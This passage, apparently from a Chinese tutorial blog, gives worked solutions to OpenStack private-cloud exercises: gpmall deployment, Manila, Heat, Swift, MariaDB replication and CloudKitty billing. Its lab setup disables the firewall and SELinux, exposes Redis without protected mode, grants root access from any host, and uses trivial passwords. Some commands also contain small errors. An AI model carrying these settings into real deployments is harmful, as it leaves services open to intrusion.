class="line"></span><br></pre></td></tr></table></figure>

<h4 id="6-在OpenStack私有云平台，创建一台云主机，使用提供的软件包，编写一键部署脚本，要求可以一键部署gpmall商城应用系统。"><a href="#6-在OpenStack私有云平台，创建一台云主机，使用提供的软件包，编写一键部署脚本，要求可以一键部署gpmall商城应用系统。" class="headerlink" title="6.在OpenStack私有云平台，创建一台云主机，使用提供的软件包，编写一键部署脚本，要求可以一键部署gpmall商城应用系统。"></a>6.在OpenStack私有云平台，创建一台云主机，使用提供的软件包，编写一键部署脚本，要求可以一键部署gpmall商城应用系统。</h4><h5 id="手动部署"><a href="#手动部署" class="headerlink" title="手动部署"></a>手动部署</h5><p>Ⅰ.环境配置</p>
<p>①<strong>修改主机名</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname mall</span><br></pre></td></tr></table></figure>

<p><strong>②配置&#x2F;etc&#x2F;hosts主机映射</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">192.168.200.103 mall</span><br></pre></td></tr></table></figure>

<p><strong>③关闭防火墙和selinux</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">systemctl stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"><span class="comment">#关闭安全策略</span></span><br><span class="line">setenforce 0 </span><br><span class="line">sed -i <span class="string">&#x27;s/SELINUX=enforcing/SELINUX=disabled/g&#x27;</span> /etc/selinux/config</span><br></pre></td></tr></table></figure>

<p><strong>④配置本地仓库</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#上传相对应的镜像和gpmall-repo</span></span><br><span class="line"><span class="built_in">mkdir</span> /opt/centos</span><br><span class="line">mount CentOS-7-x86_64-DVD-1804.iso  /opt/centos/</span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /etc/yum</span><br><span class="line">vi /etc/yum.repos.d/local.repo</span><br><span class="line"></span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[gpmall-mall]</span><br><span class="line">name=gpmall-mall</span><br><span class="line">baseurl=file:///root/gpmall-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>

<p>Ⅱ.应用系统的基础服务安装</p>
<p>①安装java<strong>环境</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install -y java-1.8.0-openjdk java-1.8.0-openjdk-devel</span><br><span class="line">[root@mall ~]# java -version</span><br><span class="line">openjdk version <span class="string">&quot;1.8.0_222&quot;</span></span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_222-b10)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.222-b10, mixed mode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>②安装redis,nginx,mariadb</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install redis nginx mariadb mariadb-server -y</span><br></pre></td></tr></table></figure>

<p>③安装zookeeper</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上传安装包</span></span><br><span class="line">tar -zxvf zookeeper-3.4.14.tar.gz -C /opt/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入到zookeeper-3.4.14/bin目录下，并启动ZooKeeper服务</span></span><br><span class="line">cd /opt/zookeeper-3.4.14/conf</span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line">cd ../bin</span><br><span class="line">./zkServer.sh start</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看状态</span></span><br><span class="line">./zkServer.sh status</span><br></pre></td></tr></table></figure>

<p><strong>④安装kafka</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将提供的kafka_2.11-1.1.1.tgz包上传到服务器的/opt目录下，并解压该压缩包</span></span><br><span class="line">tar -zxvf kafka_2.11-1.1.1.tgz -C /opt/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入到kafka_2.11-1.1.1/bin目录下，启动Kafka服务</span></span><br><span class="line">cd kafka_2.11-1.1.1/bin/</span><br><span class="line"> ./kafka-server-start.sh -daemon ../config/server.properties</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看是否成功启动</span></span><br><span class="line">[root@mall ~]# jps</span><br><span class="line">11371 QuorumPeerMain</span><br><span class="line">11692 Kafka</span><br><span class="line">13183 Jps</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Ⅲ修改服务配置</p>
<p>①配置mariadb服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改/etc/my.cnf配置文件</span></span><br><span class="line">vi /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">port=8066 <span class="comment">#若使用的是项目四软件包</span></span><br><span class="line">init_connect=<span class="string">&#x27;SET collation_connection = utf8_unicode_ci&#x27;</span></span><br><span class="line">init_connect=<span class="string">&#x27;SET NAMES utf8&#x27;</span></span><br><span class="line">character-set-server=utf8</span><br><span class="line">collation-server=utf8_unicode_ci</span><br><span class="line">skip-character-set-client-handshake</span><br><span class="line"><span class="comment">#启动数据库服务</span></span><br><span class="line">systemctl start mariadb</span><br><span class="line"><span class="comment">#设置密码</span></span><br><span class="line">mysqladmin -uroot password 123456</span><br><span class="line"><span class="comment">#配置授权</span></span><br><span class="line">mysql -uroot -p123456</span><br><span class="line">-&gt; grant all privileges on *.* to root@localhost identified by <span class="string">&#x27;123456&#x27;</span> with grant option;</span><br><span class="line">-&gt; grant all privileges on *.* to root@<span class="string">&quot;%&quot;</span> identified by <span class="string">&#x27;123456&#x27;</span> with grant option;</span><br><span class="line"><span class="comment">#将gpmall.sql上传到root</span></span><br><span class="line"><span class="comment">#创建数据库gpmall并导入gpmall.sql文件</span></span><br><span class="line">-&gt; create database gpmall;</span><br><span class="line">-&gt; <span class="built_in">source</span> /root/gpmall.sql</span><br><span class="line">-&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>②配置reids服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改Redis配置文件，编辑/etc/redis.conf文件</span></span><br><span class="line">vi /etc/redis.conf</span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">将61行的<span class="built_in">bind</span> 127.0.0.1这一行注释掉（在前面加个#号注释）</span></span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">将80行的protected-mode <span class="built_in">yes</span> 改为 protected-mode no</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动服务</span></span><br><span class="line">systemctl start redis</span><br><span class="line">systemctl enable redis</span><br></pre></td></tr></table></figure>

<p>③配置nginx</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动服务</span></span><br><span class="line">systemctl start nginx</span><br><span class="line">systemctl enable nginx</span><br></pre></td></tr></table></figure>

<p>Ⅳ修改全局变量</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#根据jar报的错误修改hosts</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.200.103 mall</span><br><span class="line">192.168.200.103 kafka1.mall</span><br><span class="line">127.0.0.1 mysql.mall</span><br><span class="line">192.168.200.103 redis.mall</span><br><span class="line">192.168.200.103 zk1.mall</span><br><span class="line"><span class="comment">#部署前端</span></span><br><span class="line"><span class="built_in">rm</span> -rf /usr/share/nginx/html/*</span><br><span class="line"><span class="built_in">cp</span> -rvf /root/dist/* /usr/share/nginx/html/</span><br><span class="line">vi /etc/nginx/conf.d/default.conf</span><br><span class="line"> <span class="comment">#注意对齐</span></span><br><span class="line"> location /user &#123;</span><br><span class="line">     proxy_pass http://127.0.0.1:8082;</span><br><span class="line"> &#125;</span><br><span class="line"> location /shopping &#123;</span><br><span class="line">     proxy_pass http://127.0.0.1:8081;</span><br><span class="line"> &#125;</span><br><span class="line"> location /cashier &#123;</span><br><span class="line">     proxy_pass http://127.0.0.1:8083;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">#重启Nginx服务</span></span><br><span class="line"> systemctl restart nginx</span><br><span class="line"><span class="comment">#部署后端</span></span><br><span class="line"><span class="built_in">nohup</span> java -jar shopping-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"><span class="built_in">nohup</span> java -jar user-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"><span class="built_in">nohup</span> java -jar gpmall-shopping-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"><span class="built_in">nohup</span> java -jar gpmall-user-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"> <span class="comment">#验证状态</span></span><br><span class="line"> <span class="built_in">jobs</span></span><br></pre></td></tr></table></figure>



<h4 id="7-使用manila共享文件系统服务，使manila为多租户云环境中的共享文件系统提供统一的管理服务。"><a href="#7-使用manila共享文件系统服务，使manila为多租户云环境中的共享文件系统提供统一的管理服务。" class="headerlink" title="7.使用manila共享文件系统服务，使manila为多租户云环境中的共享文件系统提供统一的管理服务。"></a>7.使用manila共享文件系统服务，使manila为多租户云环境中的共享文件系统提供统一的管理服务。</h4><p>使用Manila命令创建default_type_share共享类型</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">source</span> /etc/keystone/admin-openrc.sh </span><br><span class="line">[root@controller ~]# manila type-create default_share_type False</span><br><span class="line">+----------------------+--------------------------------------+</span><br><span class="line">| Property             | Value                                |</span><br><span class="line">+----------------------+--------------------------------------+</span><br><span class="line">| required_extra_specs | driver_handles_share_servers : False |</span><br><span class="line">| Name                 | default_share_type                   |</span><br><span class="line">| Visibility           | public                               |</span><br><span class="line">| is_default           | YES                                  |</span><br><span class="line">| ID                   | 0fec7bca-f1a1-4e92-8d4b-aaf02147571a |</span><br><span class="line">| optional_extra_specs |                                      |</span><br><span class="line">| Description          | None                                 |</span><br><span class="line">+----------------------+--------------------------------------+‘</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看类型列表信息</span></span><br><span class="line">[root@controller ~]# manila type-list</span><br><span class="line">+--------------------------------------+--------------------+------------+------------+--------------------------------------+----------------------+-------------+</span><br><span class="line">| ID                                   | Name               | visibility | is_default | required_extra_specs                 | optional_extra_specs | Description |</span><br><span class="line">+--------------------------------------+--------------------+------------+------------+--------------------------------------+----------------------+-------------+</span><br><span class="line">| 0fec7bca-f1a1-4e92-8d4b-aaf02147571a | default_share_type | public     | YES        | driver_handles_share_servers : False |                      | None        |</span><br><span class="line">+--------------------------------------+--------------------+------------+------------+--------------------------------------+----------------------+-------------+</span><br></pre></td></tr></table></figure>

<p><strong>创建共享文件目录</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建目录大小为2g的共享目录shre-test</span></span><br><span class="line">[root@controller ~]# manila create NFS 2 --name share-test</span><br><span class="line">+---------------------------------------+--------------------------------------+</span><br><span class="line">| Property                              | Value                                |</span><br><span class="line">+---------------------------------------+--------------------------------------+</span><br><span class="line">| status                                | creating                             |</span><br><span class="line">| share_type_name                       | default_share_type                   |</span><br><span class="line">| description                           | None                                 |</span><br><span class="line">| availability_zone                     | None                                 |</span><br><span class="line">| share_network_id                      | None                                 |</span><br><span class="line">| share_server_id                       | None                                 |</span><br><span class="line">| share_group_id                        | None                                 |</span><br><span class="line">| host                                  |                                      |</span><br><span class="line">| revert_to_snapshot_support            | False                                |</span><br><span class="line">| access_rules_status                   | active                               |</span><br><span class="line">| snapshot_id                           | None                                 |</span><br><span class="line">| create_share_from_snapshot_support    | False                                |</span><br><span class="line">| is_public                             | False                                |</span><br><span class="line">| task_state                            | None                                 |</span><br><span class="line">| snapshot_support                      | False                                |</span><br><span class="line">| <span class="built_in">id</span>                                    | a4b2a4f1-421f-4de3-8fca-d2ee8a5f4bb9 |</span><br><span class="line">| size                                  | 2                                    |</span><br><span class="line">| source_share_group_snapshot_member_id | None                                 |</span><br><span class="line">| user_id                               | 89f8027475294689ae6c0183fa35bf5a     |</span><br><span class="line">| name                                  | share-test                           |</span><br><span class="line">| share_type                            | 0fec7bca-f1a1-4e92-8d4b-aaf02147571a |</span><br><span class="line">| has_replicas                          | False                                |</span><br><span class="line">| replication_type                      | None                                 |</span><br><span class="line">| created_at                            | 2022-05-06T11:24:02.000000           |</span><br><span class="line">| share_proto                           | NFS                                  |</span><br><span class="line">| mount_snapshot_support                | False                                |</span><br><span class="line">| project_id                            | 0b6f2d0be1d342e09edc31dc841db7a5     |</span><br><span class="line">| metadata                              | &#123;&#125;                                   |</span><br><span class="line">+---------------------------------------+--------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="comment">#查询所创建的共享目录列表信息</span></span><br><span class="line">[root@controller ~]# manila list</span><br><span class="line">+--------------------------------------+------------+------+-------------+-----------+-----------+--------------------+--------------------------------+-------------------+</span><br><span class="line">| ID                                   | Name       | Size | Share Proto | Status    | Is Public | Share Type Name    | Host                           | Availability Zone |</span><br><span class="line">+--------------------------------------+------------+------+-------------+-----------+-----------+--------------------+--------------------------------+-------------------+</span><br><span class="line">| a4b2a4f1-421f-4de3-8fca-d2ee8a5f4bb9 | share-test | 2    | NFS         | available | False     | default_share_type | controller@lvm#lvm-single-pool | nova              |</span><br><span class="line">+--------------------------------------+------------+------+-------------+-----------+-----------+--------------------+--------------------------------+-------------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用Manila命令开放share-test目录对OpenStack管理网段使用权限</span></span><br><span class="line">[root@controller ~]# manila access-allow share-test ip  0.0.0.0/24 --access-level rw</span><br><span class="line">+--------------+--------------------------------------+</span><br><span class="line">| Property     | Value                                |</span><br><span class="line">+--------------+--------------------------------------+</span><br><span class="line">| access_key   | None                                 |</span><br><span class="line">| share_id     | a4b2a4f1-421f-4de3-8fca-d2ee8a5f4bb9 |</span><br><span class="line">| created_at   | 2022-05-06T11:27:19.000000           |</span><br><span class="line">| updated_at   | None                                 |</span><br><span class="line">| access_type  | ip                                   |</span><br><span class="line">| access_to    | 0.0.0.0/24                       |</span><br><span class="line">| access_level | rw                                   |</span><br><span class="line">| state        | queued_to_apply                      |</span><br><span class="line">| <span class="built_in">id</span>           | 9813f7f2-d15f-46cf-ad2d-062ce6ce3264 |</span><br><span class="line">| metadata     | &#123;&#125;                                   |</span><br><span class="line">+--------------+--------------------------------------+</span><br><span class="line"><span class="comment">#查看share-test目录共享目录权限及开放网段</span></span><br><span class="line">[root@controller ~]# manila access-list share-test</span><br><span class="line">+--------------------------------------+-------------+----------------+--------------+--------+------------+----------------------------+------------+</span><br><span class="line">| <span class="built_in">id</span>                                   | access_type | access_to      | access_level | state  | access_key | created_at                 | updated_at |</span><br><span class="line">+--------------------------------------+-------------+----------------+--------------+--------+------------+----------------------------+------------+</span><br><span class="line">| 9813f7f2-d15f-46cf-ad2d-062ce6ce3264 | ip          | 10.24.195.0/24 | rw           | active | None       | 2022-05-06T11:27:19.000000 | None       |</span><br><span class="line">+--------------------------------------+-------------+----------------+--------------+--------+------------+----------------------------+------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看share-test目录共享目录访问路径</span></span><br><span class="line">[root@controller ~]# manila show share-test | grep path | <span class="built_in">cut</span> -d<span class="string">&#x27;|&#x27;</span> -f3</span><br><span class="line"> path = 127.0.0.1:/var/lib/manila/mnt/share-55f94a46-9ac0-4b7e-8981-d83ac6fce8d7 </span><br><span class="line"><span class="comment">#在openStack控制节点将share-test共享目录挂载至/mnt目录下</span></span><br><span class="line">[root@controller ~]# mount -t nfs 172.30.17.5:/var/lib/manila/mnt/share-c3f5a9fc-a8e7-40a6-a43b-56cfd1738724 /mnt/</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看挂载信息</span></span><br><span class="line">[root@controller ~]# <span class="built_in">df</span> -th</span><br><span class="line">文件系统                                                                                                                 类型   容量  已用  可用     已用%  挂载点</span><br><span class="line">devtmpfs                                                                                                          devtmpfs  5.8G  0       5.8G      0%     /dev</span><br><span class="line">tmpfs                                                                                                                     tmpfs  5.8G  68K   5.8G     1%       /dev/shm</span><br><span class="line">tmpfs                                                                                                                     tmpfs  5.8G 592M 5.3G     10%     /run</span><br><span class="line">tmpfs                                                                                                                     tmpfs  5.8G  0        5.8G     0%     /sys/fs/cgroup</span><br><span class="line">/dev/vda1                                                                                                                 xfs    50G   8.1G 42G     17%     /</span><br><span class="line">tmpfs                                                                                                                     tmpfs  1.2G   0      1.2G      0%     /run/user/0</span><br><span class="line">172.30.17.5:/var/lib/manila/mnt/share-c3f5a9fc-a8e7-40a6-a43b-56cfd1738724 nfs4   2.0G  6.0M  1.8G    1%     /mnt</span><br></pre></td></tr></table></figure>

<h1 id="第二套"><a href="#第二套" class="headerlink" title="第二套"></a>第二套</h1><h2 id="私有云运维任务：-1"><a href="#私有云运维任务：-1" class="headerlink" title="私有云运维任务："></a>私有云运维任务：</h2><p>1.使用自动搭建的OpenStack平台，登录数据库，创建库test，并在库test中创建表company（表结构如(id int not null primary key,name varchar(50),addr varchar(255))所示），在表company中插入一条数据(1,”alibaba”,”china”)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#登录数据库</span></span><br><span class="line">root@controller ~]# mysql -uroot -p</span><br><span class="line">Enter password:</span><br><span class="line">MariaDB [(none)]&gt; create database <span class="built_in">test</span>;</span><br><span class="line">Query OK, 1 row affected (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use <span class="built_in">test</span>;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="built_in">test</span>]&gt; create table company(<span class="built_in">id</span> int not null primary key,name varchar(50),addr varchar(255));</span><br><span class="line">Query OK, 0 rows affected (0.003 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="built_in">test</span>]&gt; insert into company values (1,<span class="string">&quot;alibaba&quot;</span>,<span class="string">&quot;china&quot;</span>);</span><br><span class="line">Query OK, 1 row affected (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [<span class="built_in">test</span>]&gt; <span class="keyword">select</span> * from company;</span><br><span class="line">+----+---------+-------+</span><br><span class="line">| <span class="built_in">id</span> | name    | addr  |</span><br><span class="line">+----+---------+-------+</span><br><span class="line">|  1 | alibaba | china |</span><br><span class="line">+----+---------+-------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.OpenStack各服务内部通信都是通过RPC来交互，各agent都需要去连接RabbitMQ；随着各服务agent增多，MQ的连接数会随之增多，最终可能会到达上限，成为瓶颈。使用提供的OpenStack私有云平台，通过修改limits.conf配置文件来修改RabbitMQ服务的最大连接数为10240</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# vi /etc/security/limits.conf</span><br><span class="line">openstack soft     nofile  10240</span><br><span class="line">openstack hard     nofile  10240</span><br><span class="line"><span class="comment">#在配置文件的最后添加两行内容如上,修改完之后，保存退出</span></span><br></pre></td></tr></table></figure>

<p>3.在提供的OpenStack私有云平台上，在&#x2F;root目录下编写Heat模板create_user.yaml，创建名为heat-user的用户，属于admin项目，并赋予heat-user用户admin的权限，配置用户密码为123456。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> create_user.yaml</span><br><span class="line">heat_template_version: 2018-08-31</span><br><span class="line">resources:</span><br><span class="line">  user:</span><br><span class="line">    <span class="built_in">type</span>: OS::Keystone::User</span><br><span class="line">    properties:</span><br><span class="line">      name: heat-user</span><br><span class="line">      password: <span class="string">&quot;123456&quot;</span></span><br><span class="line">      domain: demo</span><br><span class="line">      default_project: admin</span><br><span class="line">      roles: [&#123;<span class="string">&quot;role&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;project&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;]</span><br><span class="line">[root@controller ~]# openstack stack create -t create_user.yaml heat-user</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| Field               | Value                                |</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| <span class="built_in">id</span>                  | f5bbca42-7962-49ce-b8e7-2b772544a920 |</span><br><span class="line">| stack_name          | heat-user                            |</span><br><span class="line">| description         | No description                       |</span><br><span class="line">| creation_time       | 2022-10-25T07:53:28Z                 |</span><br><span class="line">| updated_time        | None                                 |</span><br><span class="line">| stack_status        | CREATE_IN_PROGRESS                   |</span><br><span class="line">| stack_status_reason | Stack CREATE started                 |</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4.在提供的OpenStack私有云平台上，使用cirros-0.3.4-x86_64-disk.img镜像，创建一个名为Gmirror1的镜像，要求启动该镜像的最小硬盘是30G、最小内存是2048M。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack image create --disk-format qcow2 --container-format bare --min-disk 30 --min-ram 2048 --file ./cirros-0.3.4-x86_64-disk.img Gmirror1</span><br><span class="line">+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                                                                                                                                                      |</span><br><span class="line">+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                                                                                                                                                           |</span><br><span class="line">| container_format | bare                                                                                                                                                                                       |</span><br><span class="line">| created_at       | 2022-10-25T07:57:28Z                                                                                                                                                                       |</span><br><span class="line">| disk_format      | qcow2                                                                                                                                                                                      |</span><br><span class="line">| file             | /v2/images/1acb0e45-eefa-4e64-aaed-b3f4e3d85c02/file                                                                                                                                       |</span><br><span class="line">| <span class="built_in">id</span>               | 1acb0e45-eefa-4e64-aaed-b3f4e3d85c02                                                                                                                                                       |</span><br><span class="line">| min_disk         | 30                                                                                                                                                                                         |</span><br><span class="line">| min_ram          | 2048                                                                                                                                                                                       |</span><br><span class="line">| name             | Gmirror1                                                                                                                                                                                   |</span><br><span class="line">| owner            | ef3705db528144cc9a33f8ace06d6d3b                                                                                                                                                           |</span><br><span class="line">| properties       | os_hash_algo=<span class="string">&#x27;sha512&#x27;</span>, os_hash_value=<span class="string">&#x27;1b03ca1bc3fafe448b90583c12f367949f8b0e665685979d95b004e48574b953316799e23240f4f739d1b5eb4c4ca24d38fdc6f4f9d8247a2bc64db25d6bbdb2&#x27;</span>, os_hidden=<span class="string">&#x27;False&#x27;</span> |</span><br><span class="line">| protected        | False                                                                                                                                                                                      |</span><br><span class="line">| schema           | /v2/schemas/image                                                                                                                                                                          |</span><br><span class="line">| size             | 13287936                                                                                                                                                                                   |</span><br><span class="line">| status           | active                                                                                                                                                                                     |</span><br><span class="line">| tags             |                                                                                                                                                                                            |</span><br><span class="line">| updated_at       | 2022-10-25T07:57:29Z                                                                                                                                                                       |</span><br><span class="line">| virtual_size     | None                                                                                                                                                                                       |</span><br><span class="line">| visibility       | shared                                                                                                                                                                                     |</span><br><span class="line">+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>5.在提供的OpenStack私有云平台上，自行安装Swift服务，新建名为chinaskill的容器，将cirros-0.3.4-x86_64-disk.img镜像上传到chinaskill容器中，并设置分段存放，每一段大小为10M。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# swift post chinaskill</span><br><span class="line">[root@controller ~]# swift upload chiaskill -S 10000000 cirros-0.3.4-x86_64-disk.img</span><br><span class="line">cirros-0.3.4-x86_64-disk.img segment 1</span><br><span class="line">cirros-0.3.4-x86_64-disk.img segment 0</span><br><span class="line">cirros-0.3.4-x86_64-disk.img</span><br></pre></td></tr></table></figure>

<p>6.使用OpenStack私有云平台，创建两台云主机vm1和vm2，在这两台云主机上分别安装数据库服务，并配置成主从数据库，vm1节点为主库，vm2节点为从库（数据库密码设置为000000）。</p>
<table>
<thead>
<tr>
<th>vm1</th>
<th>192.168.200.101</th>
<th>主库</th>
</tr>
</thead>
<tbody><tr>
<td>vm2</td>
<td>192.168.200.102</td>
<td>从库</td>
</tr>
</tbody></table>
<p>①添加主机映射(并且关闭防火墙)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">192.168.200.101 vm1</span><br><span class="line">192.168.200.102 vm2</span><br></pre></td></tr></table></figure>

<p>②安装并配置mariadb</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum -y install mariadb mariadb-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动mariadb</span></span><br><span class="line">systemctl start mariadb</span><br><span class="line"><span class="comment">#配置</span></span><br><span class="line">mysql_secure_installation </span><br><span class="line"> y 000000 000000 y n y y</span><br></pre></td></tr></table></figure>

<p>③配置主节点</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line"></span><br><span class="line">log-bin=mysql-bin</span><br><span class="line">binlog_ignore_db=mysql</span><br><span class="line">server-id=101  <span class="comment">#每个服务器都需要添加server_id配置，各个服务器的server_id需要保证唯一性，实践中通过设置为服务器ip地址的最后一位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart mariadb</span><br><span class="line"><span class="comment">#登录数据库</span></span><br><span class="line">mysql -uroot -p000000</span><br><span class="line"> <span class="comment">#授权</span></span><br><span class="line"> -&gt; grant replication slave on *.*  to <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;000000&#x27;</span>;</span><br><span class="line"> -&gt; grant replication slave on *.* to <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;000000&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>④配置从节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line">server-id=102</span><br><span class="line">log-bin=mysql-bin </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启服务</span></span><br><span class="line">systemctl restart mariadb</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">登录并配置</span></span><br><span class="line">mysql -uroot -p000000</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">change master to master_host=<span class="string">&#x27;vm1&#x27;</span>,master_user=<span class="string">&#x27;user&#x27;</span>,master_password=<span class="string">&#x27;000000</span></span></span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash"><span class="string">start slave;</span></span></span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash"><span class="string">show slave status\G;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>9.使用cloudkitty计费服务，处理虚拟机实例(compute)、云硬盘(volume)、镜像(image)、网络进出流量(network.bw.in, network.bw.out)、浮动IP(network.floating)的计费数据并进行计费规则创建，以达到费用核算目的。</p>
<p><strong>实例类型收费</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建云主机服务instance_test,通过命令创建service服务</span></span><br><span class="line">[root@controller ~]# openstack rating hashmap service create instance_test</span><br><span class="line">+---------------+--------------------------------------+</span><br><span class="line">| Name          | Service ID                           |</span><br><span class="line">+---------------+--------------------------------------+</span><br><span class="line">| instance_test | cf8029bf-dc35-4e40-b8fd-5af4a4d25a30 |</span><br><span class="line">+---------------+--------------------------------------+</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建名为flavor_name的fields</span></span><br><span class="line">root@controller ~]# openstack rating hashmap field create cf8029bf-dc35-4e40-b8fd-5af4a4d25a30 flavor_name</span><br><span class="line">+-------------+--------------------------------------+--------------------------------------+</span><br><span class="line">| Name        | Field ID                             | Service ID                           |</span><br><span class="line">+-------------+--------------------------------------+--------------------------------------+</span><br><span class="line">| flavor_name | b2f0d485-df20-4f2e-bd44-d3696971cb8f | cf8029bf-dc35-4e40-b8fd-5af4a4d25a30 |</span><br><span class="line">+-------------+--------------------------------------+--------------------------------------+</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置规格为m1.small的云主机单价为1元</span></span><br><span class="line">[root@controller ~]# openstack rating hashmap mapping create  --field-id b2f0d485-df20-4f2e-bd44-d3696971cb8f  -t flat --value  m1.small 1</span><br><span class="line">+--------------------+--------+----------+----+--------------------+----------+--------+----------+</span><br><span class="line">| Mapping ID         |Value   |Cost      |Type| Field ID           |Service ID|Group ID|Project ID|</span><br><span class="line">+--------------------+--------+----------+----+--------------------+----------+--------+----------+</span><br><span class="line">| c1b7d4db-c1d2-4488 |m1.small|1.00000000|flat| b2f0d485-df20-4f2e | None     | None   | None     |</span><br><span class="line">  -ac46-1a8eb70d76e4                            -bd44-d3696971cb8f</span><br><span 